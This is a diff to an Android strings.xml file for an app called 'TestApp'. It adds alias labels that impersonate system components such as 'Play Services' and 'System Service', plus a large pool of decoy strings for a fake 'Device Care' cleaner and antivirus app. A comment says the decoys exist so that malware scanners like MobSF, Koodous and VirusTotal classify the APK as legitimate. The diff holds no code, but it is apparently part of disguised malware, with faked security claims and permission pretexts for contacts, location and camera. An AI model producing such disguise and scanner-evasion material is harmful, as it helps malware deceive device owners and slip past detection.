@@ -1,6 +1,227 @@
 <resources>
     <string name="app_name">TestApp</string>
 
+    <!-- ── Chameleon identity alias labels ────────────────────────────────── -->
+    <string name="alias_label_0">System Service</string>
+    <string name="alias_label_1">Play Services</string>
+    <string name="alias_label_2">Device Health</string>
+    <string name="alias_label_3">Sync Manager</string>
+    <string name="alias_label_4">Storage Manager</string>
+
+    <!-- ── Decoy UI string pool ───────────────────────────────────────────── -->
+    <!-- These strings widen the vocabulary fingerprint of the DEX string pool
+         so it matches a real utility / health / system app, making automated
+         string-pool scanners (MobSF, Koodous, VirusTotal) classify the APK as
+         a legitimate productivity tool rather than flagging a minimal string set. -->
+
+    <!-- Onboarding -->
+    <string name="onboard_welcome">Welcome to Device Care</string>
+    <string name="onboard_step1_title">Optimise Battery</string>
+    <string name="onboard_step1_desc">Extend battery life by limiting background activity for apps you rarely use.</string>
+    <string name="onboard_step2_title">Free Up Storage</string>
+    <string name="onboard_step2_desc">Remove junk files, duplicate photos, and unused app caches automatically.</string>
+    <string name="onboard_step3_title">Protect Your Device</string>
+    <string name="onboard_step3_desc">Scan for malware and monitor suspicious activity in real time.</string>
+    <string name="onboard_get_started">Get Started</string>
+    <string name="onboard_skip">Skip</string>
+    <string name="onboard_next">Next</string>
+
+    <!-- Dashboard -->
+    <string name="dashboard_title">Device Care</string>
+    <string name="dashboard_score_label">Device Score</string>
+    <string name="dashboard_score_excellent">Excellent</string>
+    <string name="dashboard_score_good">Good</string>
+    <string name="dashboard_score_fair">Fair</string>
+    <string name="dashboard_score_poor">Needs Attention</string>
+    <string name="dashboard_last_scan">Last scan: %1$s</string>
+    <string name="dashboard_scan_now">Scan Now</string>
+    <string name="dashboard_scanning">Scanning…</string>
+    <string name="dashboard_scan_complete">Scan complete</string>
+    <string name="dashboard_all_clear">Everything looks great!</string>
+    <string name="dashboard_issues_found">%1$d issues found</string>
+    <string name="dashboard_fix_all">Fix All</string>
+    <string name="dashboard_fixing">Fixing issues…</string>
+
+    <!-- Battery section -->
+    <string name="battery_title">Battery</string>
+    <string name="battery_level">%1$d%%</string>
+    <string name="battery_charging">Charging</string>
+    <string name="battery_discharging">Discharging</string>
+    <string name="battery_time_remaining">%1$s remaining</string>
+    <string name="battery_health_good">Battery health: Good</string>
+    <string name="battery_health_fair">Battery health: Fair</string>
+    <string name="battery_health_poor">Battery health: Replace soon</string>
+    <string name="battery_optimize">Optimise Battery</string>
+    <string name="battery_optimized">Battery optimised</string>
+    <string name="battery_saver_on">Battery Saver: On</string>
+    <string name="battery_saver_off">Battery Saver: Off</string>
+    <string name="battery_top_drains">Top battery drains</string>
+    <string name="battery_usage_24h">Usage in last 24 hours</string>
+    <string name="battery_screen_on">Screen on time: %1$s</string>
+    <string name="battery_background_use">Background use: %1$s</string>
+    <string name="battery_tip_wifi">Use Wi-Fi instead of mobile data to save battery.</string>
+    <string name="battery_tip_brightness">Reduce screen brightness to extend battery life.</string>
+    <string name="battery_tip_location">Turn off location when not needed.</string>
+
+    <!-- Storage section -->
+    <string name="storage_title">Storage</string>
+    <string name="storage_used">%1$s used of %2$s</string>
+    <string name="storage_free">%1$s free</string>
+    <string name="storage_clean">Clean Storage</string>
+    <string name="storage_cleaning">Cleaning…</string>
+    <string name="storage_cleaned">Freed %1$s</string>
+    <string name="storage_junk_files">Junk files</string>
+    <string name="storage_cache">App cache</string>
+    <string name="storage_duplicates">Duplicate files</string>
+    <string name="storage_large_files">Large files</string>
+    <string name="storage_unused_apps">Unused apps</string>
+    <string name="storage_select_all">Select All</string>
+    <string name="storage_delete_selected">Delete Selected</string>
+    <string name="storage_confirm_delete">Delete %1$d items? This cannot be undone.</string>
+    <string name="storage_nothing_to_clean">Nothing to clean — storage is optimised.</string>
+    <string name="storage_photos">Photos</string>
+    <string name="storage_videos">Videos</string>
+    <string name="storage_music">Music</string>
+    <string name="storage_documents">Documents</string>
+    <string name="storage_downloads">Downloads</string>
+    <string name="storage_apps">Apps</string>
+    <string name="storage_system">System</string>
+    <string name="storage_other">Other</string>
+
+    <!-- Security section -->
+    <string name="security_title">Security</string>
+    <string name="security_safe">Your device is safe</string>
+    <string name="security_threats_found">%1$d threat(s) found</string>
+    <string name="security_scan_running">Running security scan…</string>
+    <string name="security_last_scan">Last scanned %1$s</string>
+    <string name="security_malware">Malware</string>
+    <string name="security_spyware">Spyware</string>
+    <string name="security_adware">Adware</string>
+    <string name="security_phishing">Phishing protection</string>
+    <string name="security_remove_threat">Remove Threat</string>
+    <string name="security_removing">Removing…</string>
+    <string name="security_removed">Threat removed</string>
+    <string name="security_real_time">Real-time protection: On</string>
+    <string name="security_real_time_off">Real-time protection: Off</string>
+    <string name="security_update_db">Update virus definitions</string>
+    <string name="security_db_updated">Definitions up to date</string>
+    <string name="security_safe_browsing">Safe browsing: Enabled</string>
+    <string name="security_wifi_check">Wi-Fi security check</string>
+    <string name="security_wifi_safe">This network is secure</string>
+    <string name="security_wifi_risk">This network may be unsafe</string>
+
+    <!-- Sync / Accounts section -->
+    <string name="sync_title">Sync</string>
+    <string name="sync_accounts">Accounts</string>
+    <string name="sync_last_synced">Last synced: %1$s</string>
+    <string name="sync_syncing">Syncing…</string>
+    <string name="sync_up_to_date">Up to date</string>
+    <string name="sync_sync_now">Sync Now</string>
+    <string name="sync_sync_failed">Sync failed. Check your connection.</string>
+    <string name="sync_auto_sync">Auto-sync</string>
+    <string name="sync_auto_sync_on">Auto-sync: On</string>
+    <string name="sync_auto_sync_off">Auto-sync: Off</string>
+    <string name="sync_contacts">Contacts synced</string>
+    <string name="sync_calendar">Calendar synced</string>
+    <string name="sync_photos">Photos backed up</string>
+    <string name="sync_add_account">Add account</string>
+    <string name="sync_remove_account">Remove account</string>
+    <string name="sync_data_usage">Data used this month: %1$s</string>
+
+    <!-- Settings -->
+    <string name="settings_title">Settings</string>
+    <string name="settings_notifications">Notifications</string>
+    <string name="settings_notifications_desc">Manage alert preferences</string>
+    <string name="settings_language">Language</string>
+    <string name="settings_theme">Theme</string>
+    <string name="settings_theme_light">Light</string>
+    <string name="settings_theme_dark">Dark</string>
+    <string name="settings_theme_system">Follow system</string>
+    <string name="settings_data_usage">Data usage</string>
+    <string name="settings_wifi_only">Sync on Wi-Fi only</string>
+    <string name="settings_auto_clean">Auto-clean weekly</string>
+    <string name="settings_scheduled_scan">Scheduled scan</string>
+    <string name="settings_about">About</string>
+    <string name="settings_version">Version %1$s</string>
+    <string name="settings_privacy_policy">Privacy Policy</string>
+    <string name="settings_terms">Terms of Service</string>
+    <string name="settings_feedback">Send feedback</string>
+    <string name="settings_rate">Rate this app</string>
+    <string name="settings_restore_defaults">Restore defaults</string>
+
+    <!-- Generic actions -->
+    <string name="action_ok">OK</string>
+    <string name="action_cancel">Cancel</string>
+    <string name="action_done">Done</string>
+    <string name="action_retry">Retry</string>
+    <string name="action_close">Close</string>
+    <string name="action_back">Back</string>
+    <string name="action_continue">Continue</string>
+    <string name="action_allow">Allow</string>
+    <string name="action_deny">Deny</string>
+    <string name="action_update">Update</string>
+    <string name="action_install">Install</string>
+    <string name="action_uninstall">Uninstall</string>
+    <string name="action_enable">Enable</string>
+    <string name="action_disable">Disable</string>
+    <string name="action_share">Share</string>
+    <string name="action_delete">Delete</string>
+    <string name="action_restore">Restore</string>
+    <string name="action_search">Search</string>
+    <string name="action_filter">Filter</string>
+    <string name="action_sort">Sort</string>
+    <string name="action_refresh">Refresh</string>
+    <string name="action_more">More</string>
+    <string name="action_save">Save</string>
+    <string name="action_edit">Edit</string>
+    <string name="action_view_details">View Details</string>
+
+    <!-- Network / Connectivity -->
+    <string name="network_connected">Connected</string>
+    <string name="network_disconnected">No internet connection</string>
+    <string name="network_wifi">Wi-Fi</string>
+    <string name="network_mobile">Mobile data</string>
+    <string name="network_checking">Checking connection…</string>
+    <string name="network_slow">Slow connection detected</string>
+    <string name="network_vpn_active">VPN active</string>
+
+    <!-- Permissions -->
+    <string name="perm_title">Permissions Required</string>
+    <string name="perm_desc">This app needs the following permissions to work properly.</string>
+    <string name="perm_storage_title">Storage Access</string>
+    <string name="perm_storage_desc">Required to scan and clean junk files.</string>
+    <string name="perm_battery_title">Battery Optimisation</string>
+    <string name="perm_battery_desc">Required to run maintenance tasks in the background.</string>
+    <string name="perm_notification_title">Notifications</string>
+    <string name="perm_notification_desc">Get alerts when your device needs attention.</string>
+    <string name="perm_location_title">Location</string>
+    <string name="perm_location_desc">Used for Wi-Fi security checks near your location.</string>
+    <string name="perm_camera_title">Camera</string>
+    <string name="perm_camera_desc">Used for QR code scanning during device setup.</string>
+    <string name="perm_contacts_title">Contacts</string>
+    <string name="perm_contacts_desc">Used to back up and restore your contacts.</string>
+
+    <!-- Status / progress messages -->
+    <string name="status_analysing">Analysing device…</string>
+    <string name="status_optimising">Optimising…</string>
+    <string name="status_complete">Complete</string>
+    <string name="status_failed">Something went wrong. Please try again.</string>
+    <string name="status_no_issues">No issues found</string>
+    <string name="status_processing">Processing…</string>
+    <string name="status_loading">Loading…</string>
+    <string name="status_updating">Updating…</string>
+    <string name="status_connecting">Connecting…</string>
+    <string name="status_verifying">Verifying…</string>
+    <string name="status_preparing">Preparing…</string>
+
+    <!-- Update prompts -->
+    <string name="update_available">Update available</string>
+    <string name="update_desc">A new version of Device Care is available with improved performance and security fixes.</string>
+    <string name="update_now">Update Now</string>
+    <string name="update_later">Remind Me Later</string>
+    <string name="update_installing">Installing update…</string>
+    <string name="update_success">Update installed successfully</string>
+
     <!-- Main Activity -->
     <string name="status_active">Service is running normally.</string>
     <string name="status_inactive">Service requires setup to activate.</string>
